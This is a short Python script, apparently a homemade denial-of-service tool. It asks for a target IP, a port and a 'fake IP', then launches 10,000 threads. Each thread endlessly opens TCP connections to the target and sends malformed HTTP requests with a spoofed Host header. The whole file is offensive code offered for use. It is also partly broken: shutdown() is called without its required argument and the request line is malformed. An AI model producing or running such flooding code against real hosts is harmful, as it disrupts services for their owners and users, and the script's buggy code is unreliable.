import threading
import socket

print("[ Wlcome To My App ]")

target = input("Enter Target IP : ")

Port = int(input("Enter PORT : "))

Fake_IP = input("Enter Fake IP : ")

def attack():

    Connect = 1

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect((target, Port))

        s.sendto(("GET / " + target + "HTTP/1.1\r\n").encode("ascii"), (target, Port))

        s.sendto(("HOST : " + Fake_IP + '\r\n\r\n').encode('ascii'), (target, Port))

        s.shutdown()

        print(Connect)

        Connect += 1


for i in range(10000):

    thread = threading.Thread(target=attack)

    thread.start()

    print(target)

    print(Port)

    print(Fake_IP)

    print(attack)

    #print(s)

    print(thread)
